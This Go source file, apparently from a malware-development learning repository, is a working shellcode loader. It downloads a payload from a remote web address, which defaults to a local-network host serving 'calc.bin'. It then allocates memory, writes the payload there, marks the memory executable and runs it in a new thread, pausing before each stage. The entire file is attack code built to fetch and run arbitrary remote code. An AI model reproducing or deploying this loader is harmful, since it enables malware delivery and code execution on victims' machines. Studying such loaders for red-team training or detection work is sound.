package main

import (
	"flag"
	"fmt"
	"unsafe"

	"github.com/mortimus/maldev/pkg/maldev"
	"github.com/mortimus/maldev/pkg/shellcode"
)

func main() {
	remoteSC := flag.String("sc", "http://192.168.86.107:8000/calc.bin", "Web Address to shellcode file")
	flag.Parse()
	if *remoteSC == "" {
		fmt.Printf("[!] Please Provide A Shellcode URL\n")
		return
	}
	// DOWNLOAD SHELLCODE
	// Get the data
	decrypted, err := maldev.DownloadFromURL(*remoteSC)
	if err != nil {
		fmt.Printf("[!] Failed To Download Shellcode : %s \n", err)
		return
	}
	shellcode.Print("Decrypted Shellcode", 0, decrypted)
	fmt.Printf("[#] Press <ENTER> to Allocate\n")
	fmt.Scanln()
	// ALLOCATE MEMORY
	addr, err := maldev.VirtualAlloc(0, maldev.SIZE_T(len(decrypted)), maldev.MEM_COMMIT|maldev.MEM_RESERVE, maldev.PAGE_READWRITE)
	if err != nil {
		fmt.Printf("[!] VirtualAlloc Failed With Error : %s \n", err)
		return
	}
	fmt.Printf("[i] Allocated Memory At : 0x%p \n", unsafe.Pointer(addr))
	fmt.Printf("[#] Press <Enter> To Write Payload ... ")
	fmt.Scanln()
	// WRITE SHELLCODE
	maldev.Memcpy(unsafe.Pointer(addr), unsafe.Pointer(&decrypted[0]), maldev.SIZE_T(len(decrypted)))
	maldev.Memset(unsafe.Pointer(&decrypted[0]), 0, maldev.SIZE_T(len(decrypted)))

	var dwOldProtection maldev.DWORD
	err = maldev.VirtualProtect(addr, maldev.SIZE_T(len(decrypted)), maldev.PAGE_EXECUTE_READWRITE, &dwOldProtection)
	if err != nil {
		fmt.Printf("[!] VirtualProtect Failed With Error : %s \n", err)
		return
	}
	fmt.Printf("[#] Press <Enter> To Run ... ")
	fmt.Scanln()

	_, err = maldev.CreateThread(maldev.NULL, maldev.NULL, maldev.LPTHREAD_START_ROUTINE(addr), maldev.NULL, maldev.NULL, nil)
	if err != nil {
		fmt.Printf("[!] CreateThread Failed With Error : %s \n", err)
		return
	}
	// HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	decrypted = nil

	fmt.Printf("[#] Press <Enter> To Quit ...")
	fmt.Scanln()
	// Free Memory
	maldev.VirtualFree(addr, 0, maldev.MEM_RELEASE)
}
